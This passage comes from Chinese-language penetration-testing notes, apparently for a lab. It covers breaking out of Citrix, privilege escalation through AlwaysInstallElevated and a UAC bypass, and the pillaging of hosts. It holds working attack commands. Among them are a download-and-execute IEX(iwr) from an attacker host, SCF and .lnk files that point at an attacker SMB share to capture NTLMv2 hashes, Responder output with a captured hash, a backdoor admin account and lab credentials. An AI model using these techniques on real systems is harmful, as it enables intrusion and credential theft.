class="code"><pre><span class="line">Username: pmorgan</span><br><span class="line">Password: Summer1Summer!</span><br><span class="line">Domain: \.local</span><br></pre></td></tr></table></figure><h2 id="绕过路径限制"><a href="#绕过路径限制" class="headerlink" title="绕过路径限制"></a>绕过路径限制</h2><p>通过 Citrix 部署的众多桌面应用程序都具备与操作系统上的文件交互的功能。保存、另存为、打开、加载、浏览、导入、导出、帮助、搜索、扫描和打印等功能通常为攻击者提供了调用 Windows 对话框的机会。</p><p>可以在文件名字段下输入 <a href="https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths">UNC</a> 路径<code> \\127.0.0.1\c$\users\pmorgan</code>，将文件类型设置为所有文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\127.0.0.1\c$\users\pmorgan</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732336907430.png" alt="paint_flag"></p><h2 id="从受限环境访问-SMB-共享"><a href="#从受限环境访问-SMB-共享" class="headerlink" title="从受限环境访问 SMB 共享"></a>从受限环境访问 SMB 共享</h2><p>由于设置了限制，文件资源管理器不允许直接访问攻击者机器上的 SMB 共享或托管 Citrix 环境的 Ubuntu 服务器上的 SMB 共享。但是，通过利用 Windows 对话框中的 UNC 路径，可以绕过此限制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbserver.py -smb2support share $(pwd)</span><br></pre></td></tr></table></figure><p>UNC 路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\10.13.38.95\share</span><br></pre></td></tr></table></figure><p>由于文件资源管理器中存在限制，因此无法直接复制文件。不过，另一种方法是右键单击可执行文件，然后启动它。</p><p>可执行文件 pwn.exe 是从 pwn.c 文件的自定义编译二进制文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;C:\Windows\\System32\\cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732336311916.png" alt="paint_share"></p><h2 id="替代资源管理器"><a href="#替代资源管理器" class="headerlink" title="替代资源管理器"></a>替代资源管理器</h2><p>如果对文件资源管理器施加了严格限制，可以使用替代文件系统编辑器（如 Q-Dir 或 Explorer++）作为解决方法。这些工具可以绕过组策略强制执行的文件夹限制，允许用户浏览和访问在标准文件资源管理器环境中原本受限制的文件和目录。</p><p>由于存在限制，文件资源管理器以前无法从 SMB 共享复制文件。但是，通过使用 <code>Explorer++</code>，已成功演示了将文件从<code> \\10.13.38.95\share</code> 位置复制到属于用户 <code>pmorgan</code> 的桌面的功能（如以下屏幕截图所示）。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732194722782.png" alt="Explorer++"></p><h2 id="备用注册表编辑器"><a href="#备用注册表编辑器" class="headerlink" title="备用注册表编辑器"></a>备用注册表编辑器</h2><p>同样，当默认注册表编辑器被组策略阻止时，可以使用替代注册表编辑器来绕过标准组策略限制。Simpleregedit、Uberregedit 和 SmallRegistryEditor 就是此类 GUI 工具的示例，它们有助于编辑 Windows 注册表，而不会受到组策略强加的阻止的影响。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732194848642.png" alt="smallregistry"></p><h2 id="修改现有快捷方式文件"><a href="#修改现有快捷方式文件" class="headerlink" title="修改现有快捷方式文件"></a>修改现有快捷方式文件</h2><p>通过修改现有 Windows 快捷方式并在目标字段中设置所需的可执行文件的路径来实现对文件夹路径的未经授权的访问。</p><p>以下步骤概述了该过程：</p><ol><li><p>右键单击所需的快捷方式</p></li><li><p>选择属性</p></li><li><p>在该<code>Target</code>字段内，修改要访问的文件夹的路径</p></li><li><p>执行快捷方式，将生成 cmd</p></li></ol><p>如果现有快捷方式文件不可用，可以考虑其他方法。一种选择是使用 SMB 服务器传输现有快捷方式文件。或者，可以使用 PowerShell 创建新的快捷方式文件，如“生成恶意 .lnk 文件”选项卡下的“与用户交互”部分中所述。</p><h2 id="脚本执行"><a href="#脚本执行" class="headerlink" title="脚本执行"></a>脚本执行</h2><p>当脚本扩展名（例如 .bat、.vbs 或 .ps）配置为使用各自的解释器自动执行其代码时，它就有可能删除可用作交互式控制台或促进下载和启动各种第三方应用程序的脚本，从而绕过现有的限制。</p><ol><li>创建一个新的文本文件并将其命名为”evil.bat”</li><li>使用文本编辑器（例如记事本）打开”evil.bat”</li><li>在文件中输入命令”cmd”</li></ol><p>执行”evil.bat”文件后，它将启动命令提示符窗口。</p><h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><p>一旦建立了对命令提示符的访问，就可以更轻松地搜索系统中的漏洞。例如，还可以使用<a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">Winpeas</a>和<a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">PowerUp</a>等工具来识别操作系统中的潜在安全问题和漏洞。</p><p>使用<code>PowerUp.ps1</code>，如发现<a href="https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated">“Always Install Elevated”</a>键存在并设置</p><p>还可以通过查询相应的注册表项来使用命令提示符来验证这一点：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">reg</span> <span class="title">query</span> <span class="title">HKCU</span>\<span class="title">SOFTWARE</span>\<span class="title">Policies</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">Installer</span> /<span class="title">v</span> <span class="title">AlwaysInstallElevated</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HKEY_CURRENT_USER</span>\<span class="title">SOFTWARE</span>\<span class="title">Policies</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">Installer</span></span></span><br><span class="line"><span class="function"><span class="title">AlwaysInstallElevated</span>    <span class="title">REG_DWORD</span>    0<span class="title">x1</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">reg</span> <span class="title">query</span> <span class="title">HKLM</span>\<span class="title">SOFTWARE</span>\<span class="title">Policies</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">Installer</span> /<span class="title">v</span> <span class="title">AlwaysInstallElevated</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">HKEY_LOCAL_MACHINE</span>\<span class="title">SOFTWARE</span>\<span class="title">Policies</span>\<span class="title">Microsoft</span>\<span class="title">Windows</span>\<span class="title">Installer</span></span></span><br><span class="line"><span class="function"><span class="title">AlwaysInstallElevated</span>    <span class="title">REG_DWORD</span>    0<span class="title">x1</span></span></span><br></pre></td></tr></table></figure><p>利用 PowerUp 的<code>Write-UserAddMSI</code>功能。此功能可帮助直接在桌面上创建<code>.msi</code>文件。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\pmorgan\Desktop&gt; <span class="built_in">Import-Module</span> .\PowerUp.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\Users\pmorgan\Desktop&gt; <span class="built_in">Write-UserAddMSI</span></span><br><span class="line"></span><br><span class="line">Output Path</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">UserAdd.msi</span><br></pre></td></tr></table></figure><p>现在可以执行 UserAdd.msi 并在管理员组下创建一个新用户 backdoor:T3st@123。请注意，如果为其输入的密码不符合密码复杂性标准，则会引发错误。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">runas</span> /<span class="title">user:backdoor</span> <span class="title">cmd</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Enter</span> <span class="title">the</span> <span class="title">password</span> <span class="title">for</span> <span class="title">backdoor</span>: <span class="title">T3st</span>@123</span></span><br><span class="line"><span class="function"><span class="title">Attempting</span> <span class="title">to</span> <span class="title">start</span> <span class="title">cmd</span> <span class="title">as</span> <span class="title">user</span> &quot;<span class="title">VDESKTOP3</span>\<span class="title">backdoor</span>&quot; ...</span></span><br></pre></td></tr></table></figure><h2 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h2><p>即使新建立的用户后门是管理员组的成员，由于存在用户帐户控制 (UAC)，访问 <code>C:\Users\Administrator</code> 目录仍然不可行。UAC 是 Windows 中实现的一种安全机制，用于保护操作系统免受未经授权的更改。使用 UAC，每个需要管理员访问令牌的应用程序都必须提示最终用户同意。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt; <span class="title">cd</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">Administrator</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Access</span> <span class="title">is</span> <span class="title">denied</span>.</span></span><br></pre></td></tr></table></figure><p>有许多 UAC 绕过脚本可用，旨在帮助绕过主动用户帐户控制 (UAC) 机制。这些脚本提供了绕过 UAC 限制并获得提升权限的方法。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\Public&gt; <span class="built_in">Import-Module</span> .\Bypass<span class="literal">-UAC</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\Users\Public&gt; Bypass<span class="literal">-UAC</span> <span class="literal">-Method</span> UacMethodSysprep</span><br></pre></td></tr></table></figure><p>成功绕过 UAC 后，将打开一个具有更高权限的新 powershell 窗口，可以通过使用命令 whoami &#x2F;all 或 whoami &#x2F;priv 来确认这一点。</p><h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p><a href="https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/">Breaking out of Citrix and other Restricted Desktop environments</a></p><p><a href="https://node-security.com/posts/breaking-out-of-windows-environments/">Breaking out of Windows Environments</a></p><hr><h1 id="Interacting-with-Users"><a href="#Interacting-with-Users" class="headerlink" title="Interacting with Users"></a>Interacting with Users</h1><p>通过嗅探他们的网络流量&#x2F;本地命令或攻击需要用户交互的已知易受攻击的服务来窃取毫无戒心的用户的凭据。</p><h2 id="流量捕获"><a href="#流量捕获" class="headerlink" title="流量捕获"></a>流量捕获</h2><p>如果安装了<code>Wireshark</code>，非特权用户可能能够捕获网络流量，因为默认情况下未启用将 Npcap 驱动程序访问限制为仅限管理员的选项。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1731727867240.png" alt="ftp"></p><p>另外，假设客户将置于环境中的攻击机器上。在这种情况下，值得运行<code>tcpdump</code>或<code>Wireshark</code>一段时间来查看通过网络传输的流量类型以及是否可以看到任何有趣的东西。可以从攻击框运行工具<a href="https://github.com/DanMcInerney/net-creds">net-creds</a>来嗅探实时接口或 pcap 文件中的密码和哈希值。</p><h2 id="进程命令行"><a href="#进程命令行" class="headerlink" title="进程命令行"></a>进程命令行</h2><p>当以用户身份获取 shell 时，可能会有计划任务或其他正在执行的进程在命令行上传递凭据。</p><p>可以使用类似下面的脚本来查找进程命令行，它每两秒捕获一次进程命令行，并将当前状态与之前的状态进行比较，输出任何差异。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="variable">$true</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$process</span> = <span class="built_in">Get-WmiObject</span> Win32_Process | <span class="built_in">Select-Object</span> CommandLine</span><br><span class="line">  <span class="built_in">Start-Sleep</span> <span class="number">1</span></span><br><span class="line">  <span class="variable">$process2</span> = <span class="built_in">Get-WmiObject</span> Win32_Process | <span class="built_in">Select-Object</span> CommandLine</span><br><span class="line">  <span class="built_in">Compare-Object</span> <span class="literal">-ReferenceObject</span> <span class="variable">$process</span> <span class="literal">-DifferenceObject</span> <span class="variable">$process2</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将脚本托管在攻击机器上，并在目标主机上执行它</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">IEX</span> (<span class="built_in">iwr</span> <span class="string">&#x27;http://10.10.10.205/procmon.ps1&#x27;</span>) </span><br><span class="line"></span><br><span class="line">InputObject                                           SideIndicator</span><br><span class="line"><span class="literal">-----------</span>                                           <span class="literal">-------------</span></span><br><span class="line"><span class="selector-tag">@</span>&#123;CommandLine=C:\Windows\system32\DllHost.exe /Processid:&#123;AB8902B4<span class="literal">-09CA-4BB6-B78D-A8F59079A8D5</span>&#125;&#125; =&gt;      </span><br><span class="line"><span class="selector-tag">@</span>&#123;CommandLine=“C:\Windows\system32\cmd.exe” &#125;                          =&gt;      </span><br><span class="line"><span class="selector-tag">@</span>&#123;CommandLine=\??\C:\Windows\system32\conhost.exe <span class="number">0</span>x4&#125;                      =&gt;      </span><br><span class="line"><span class="selector-tag">@</span>&#123;CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0<span class="built_in">Rd</span>&#125;       =&gt;       </span><br><span class="line"><span class="selector-tag">@</span>&#123;CommandLine=“C:\Windows\system32\backgroundTaskHost.exe” <span class="literal">-ServerName</span>:CortanaUI.AppXy7vb4pc2... &lt;=</span><br></pre></td></tr></table></figure><h2 id="文件共享上的-SCF"><a href="#文件共享上的-SCF" class="headerlink" title="文件共享上的 SCF"></a>文件共享上的 SCF</h2><p>Windows 资源管理器使用 Shell 命令文件 (SCF) 在目录中上下移动、显示桌面等。可以操作 SCF 文件以使图标文件位置指向特定的 UNC 路径，并让 Windows 资源管理器在访问 .scf 文件所在的文件夹时启动 SMB 会话。如果将 IconFile 更改为控制的 SMB 服务器并运行<a href="https://github.com/lgandx/Responder">Responder</a>、<a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>或<a href="https://github.com/Kevin-Robertson/InveighZero">InveighZero</a>等工具，通常可以捕获浏览共享的任何用户的 NTLMv2。</p><p>在此示例中，让创建以下文件并将其命名为 <code>@Inventory.scf</code>（类似于目录中的另一个文件，因此它不会显得格格不入）。在文件名开头放置一个 <code>@</code>，使其出现在目录顶部，以确保用户访问共享时 Windows 资源管理器能够看到并执行它。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.14.3\share\legit.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure><h3 id="Responder-捕获哈希"><a href="#Responder-捕获哈希" class="headerlink" title="Responder 捕获哈希"></a>Responder 捕获哈希</h3><p>在攻击机上启动 Responder 并等待用户浏览共享。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">$ sudo responder -wrf -v -I tun0</span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.0.2.0</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To kill this script hit CTRL-C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    DNS/MDNS                   [ON]</span><br><span class="line"></span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [ON]</span><br><span class="line">    Auth proxy                 [OFF]</span><br><span class="line">    SMB server                 [ON]</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">    POP3 server                [ON]</span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line">    RDP server                 [ON]</span><br><span class="line"></span><br><span class="line">[+] HTTP Options:</span><br><span class="line">    Always serving EXE         [OFF]</span><br><span class="line">    Serving EXE                [OFF]</span><br><span class="line">    Serving HTML               [OFF]</span><br><span class="line">    Upstream Proxy             [OFF]</span><br><span class="line"></span><br><span class="line">[+] Poisoning Options:</span><br><span class="line">    Analyze Mode               [OFF]</span><br><span class="line">    Force WPAD auth            [OFF]</span><br><span class="line">    Force Basic Auth           [OFF]</span><br><span class="line">    Force LM downgrade         [OFF]</span><br><span class="line">    Fingerprint hosts          [ON]</span><br><span class="line"></span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [tun2]</span><br><span class="line">    Responder IP               [10.10.14.3]</span><br><span class="line">    Challenge set              [random]</span><br><span class="line">    Don&#x27;t Respond To Names     [&#x27;ISATAP&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[!] Error starting SSL server on port 443, check permissions or other servers running.</span><br><span class="line">[+] Listening for events...</span><br><span class="line">[SMB] NTLMv2-SSP Client   : 10.129.43.30</span><br><span class="line">[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...&lt;SNIP&gt;...</span><br></pre></td></tr></table></figure><h3 id="使用恶意-lnk-文件捕获哈希值"><a href="#使用恶意-lnk-文件捕获哈希值" class="headerlink" title="使用恶意 .lnk 文件捕获哈希值"></a>使用恶意 .lnk 文件捕获哈希值</h3><p>在 Server 2019 主机上，使用 SCF 不再有效，但可以使用恶意<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943">.lnk</a>文件实现相同的效果。可以使用各种工具来生成恶意 .lnk 文件，例如<a href="https://github.com/dievus/lnkbomb">Lnkbomb</a>，因为它不像创建恶意 .scf 文件那么简单。也可以使用几行 PowerShell 来创建一个：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$objShell</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> WScript.Shell</span><br><span class="line"><span class="variable">$lnk</span> = <span class="variable">$objShell</span>.CreateShortcut(<span class="string">&quot;C:\legit.lnk&quot;</span>)</span><br><span class="line"><span class="variable">$lnk</span>.TargetPath = <span class="string">&quot;\\&lt;attackerIP&gt;\@pwn.png&quot;</span></span><br><span class="line"><span class="variable">$lnk</span>.WindowStyle = <span class="number">1</span></span><br><span class="line"><span class="variable">$lnk</span>.IconLocation = <span class="string">&quot;%windir%\system32\shell32.dll, 3&quot;</span></span><br><span class="line"><span class="variable">$lnk</span>.Description = <span class="string">&quot;Browsing to the directory where this file is saved will trigger an auth request.&quot;</span></span><br><span class="line"><span class="variable">$lnk</span>.HotKey = <span class="string">&quot;Ctrl+Alt+O&quot;</span></span><br><span class="line"><span class="variable">$lnk</span>.Save()</span><br></pre></td></tr></table></figure><hr><h1 id="Pillaging"><a href="#Pillaging" class="headerlink" title="Pillaging"></a>Pillaging</h1><p>掠夺是从受感染系统获取信息的过程。这些信息可以是个人信息、公司蓝图、信用卡数据、服务器信息、基础设施和网络详细信息、密码或其他类型的凭证，以及与公司或正在进行的安全评估相关的任何信息。</p><p>以下是可以从受感染系统获取信息的一些来源：</p><ul><li>已安装的应用程序</li><li>已安装的服务<ul><li>网站</li><li>文件共享</li><li>数据库</li><li>目录服务（如 Active Directory、Azure AD 等）</li><li>名称服务器</li><li>部署服务</li><li>证书颁发机构</li><li>源代码管理服务器</li><li>虚拟化</li><li>消息传递</li><li>监控和记录系统</li><li>备份</li></ul></li><li>敏感数据<ul><li>键盘记录</li><li>屏幕截图</li><li>网络流量捕获</li><li>以前的审计报告</li></ul></li><li>用户信息<ul><li>历史文件，有趣的文档（.doc&#x2F;x、.xls&#x2F;x、password. *&#x2F;pass.*等）</li><li>角色和权限</li><li>Web 浏览器</li><li>即时通讯客户端</li></ul></li></ul><p>设想，已经在下文网络中提到的 Windows 服务器上站稳脚跟，并开始收集尽可能多的信息。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732336908029.png" alt="network"></p><h2 id="已安装的应用程序"><a href="#已安装的应用程序" class="headerlink" title="已安装的应用程序"></a>已安装的应用程序</h2><p>了解被攻陷的系统上安装了哪些应用程序可能有助于在渗透测试期间实现目标。重要的是要知道每个渗透测试都是不同的。</p><p>常见应用程序</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt;<span class="title">dir</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>&quot;</span></span><br><span class="line"><span class="function"> <span class="title">Volume</span> <span class="title">in</span> <span class="title">drive</span> <span class="title">C</span> <span class="title">has</span> <span class="title">no</span> <span class="title">label</span>.</span></span><br><span class="line"><span class="function"> <span class="title">Volume</span> <span class="title">Serial</span> <span class="title">Number</span> <span class="title">is</span> 900<span class="title">E</span>-<span class="title">A7ED</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> <span class="title">Directory</span> <span class="title">of</span> <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">07/14/2022  08:31 <span class="title">PM</span>    &lt;<span class="title">DIR</span>&gt;          .</span></span><br><span class="line"><span class="function">07/14/2022  08:31 <span class="title">PM</span>    &lt;<span class="title">DIR</span>&gt;          ..</span></span><br><span class="line"><span class="function">05/16/2022  03:57 <span class="title">PM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">Adobe</span></span></span><br><span class="line"><span class="function">05/16/2022  12:33 <span class="title">PM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">Corsair</span></span></span><br><span class="line"><span class="function">05/16/2022  10:17 <span class="title">AM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">Google</span></span></span><br><span class="line"><span class="function">05/16/2022  11:07 <span class="title">AM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">Microsoft</span> <span class="title">Office</span> 15</span></span><br><span class="line"><span class="function">07/10/2022  11:30 <span class="title">AM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">mRemoteNG</span></span></span><br><span class="line"><span class="function">07/13/2022  09:14 <span class="title">AM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">OpenVPN</span></span></span><br><span class="line"><span class="function">07/19/2022  09:04 <span class="title">PM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">Streamlabs</span> <span class="title">OBS</span></span></span><br><span class="line"><span class="function">07/20/2022  07:06 <span class="title">AM</span>    &lt;<span class="title">DIR</span>&gt;          <span class="title">TeamViewer</span></span></span><br><span class="line"><span class="function">               0 <span class="title">File</span>(<span class="title">s</span>)              0 <span class="title">bytes</span></span></span><br><span class="line"><span class="function">              16 <span class="title">Dir</span>(<span class="title">s</span>)  351,524,651,008 <span class="title">bytes</span> <span class="title">free</span></span></span><br></pre></td></tr></table></figure><p>通过 PowerShell 和注册表项获取已安装的程序</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$INSTALLED</span> = <span class="built_in">Get-ItemProperty</span> HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  <span class="built_in">Select-Object</span> DisplayName, DisplayVersion, InstallLocation</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$INSTALLED</span> += <span class="built_in">Get-ItemProperty</span> HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | <span class="built_in">Select-Object</span> DisplayName, DisplayVersion, InstallLocation</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$INSTALLED</span> | ?&#123; <span class="variable">$_</span>.DisplayName <span class="operator">-ne</span> <span class="variable">$null</span> &#125; | <span class="built_in">sort-object</span> <span class="literal">-Property</span> DisplayName <span class="literal">-Unique</span> | <span class="built_in">Format-Table</span> <span class="literal">-AutoSize</span></span><br><span class="line"></span><br><span class="line">DisplayName                                         DisplayVersion    InstallLocation</span><br><span class="line"><span class="literal">-----------</span>                                         <span class="literal">--------------</span>    <span class="literal">---------------</span></span><br><span class="line">Adobe Acrobat DC (<span class="number">64</span><span class="literal">-bit</span>)                           <span class="number">22.001</span>.<span class="number">20169</span>      C:\Program Files\Adobe\Acrobat DC\</span><br><span class="line">CORSAIR iCUE <span class="number">4</span> Software                             <span class="number">4.23</span>.<span class="number">137</span>          C:\Program Files\Corsair\CORSAIR iCUE <span class="number">4</span> Software</span><br><span class="line">Google Chrome                                       <span class="number">103.0</span>.<span class="number">5060.134</span>    C:\Program Files\Google\Chrome\Application</span><br><span class="line">Google Drive                                        <span class="number">60.0</span>.<span class="number">2.0</span>          C:\Program Files\Google\Drive File Stream\<span class="number">60.0</span>.<span class="number">2.0</span>\GoogleDriveFS.exe</span><br><span class="line">Microsoft Office Profesional Plus <span class="number">2016</span> - es<span class="literal">-es</span>      <span class="number">16.0</span>.<span class="number">15330.20264</span>  C:\Program Files (x86)\Microsoft Office</span><br><span class="line">Microsoft Office Professional Plus <span class="number">2016</span> - en<span class="literal">-us</span>     <span 